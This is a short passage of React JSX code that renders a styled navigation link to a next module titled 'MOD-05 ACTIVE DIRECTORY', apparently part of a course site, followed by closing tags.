        <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: accent, padding: '8px 20px', border: '1px solid ' + accentBorder, borderRadius: '4px', background: accentDim }}>
          NEXT: MOD-05 ACTIVE DIRECTORY →
        </Link>
      </div>
    </div>
  )
}
